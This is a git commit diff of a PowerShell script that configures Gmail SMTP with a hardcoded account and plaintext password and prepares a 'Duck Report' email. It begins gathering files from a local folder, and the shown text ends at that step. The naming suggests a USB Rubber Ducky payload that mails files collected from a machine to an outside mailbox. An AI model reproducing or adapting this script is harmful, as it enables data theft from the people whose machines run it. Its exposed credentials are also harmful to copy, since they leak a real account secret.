236e606ffe9a84d7587e8b5c9800c0355bbea9bb
apisapisapis <68765833+apisapisapis@users.noreply.github.com>
2020-08-29 13:14:58 -0300

    Update emailPowerShellCode.ps1

--- emailPowerShellCode.ps1
+++ emailPowerShellCode.ps1
@@ -1,10 +1,10 @@
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('migapis@hotmail.com', 'eternidade');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('migapis@gmail.com', 'eternidade');
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'migapis@hotmail.com'
-$ReportEmail.To.Add('migapis@hotmail.com')
+$ReportEmail.From = 'migapis@gmail.com'
+$ReportEmail.To.Add('migapis@hotmail.com.br')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
 $files=Get-ChildItem "C:\l\"
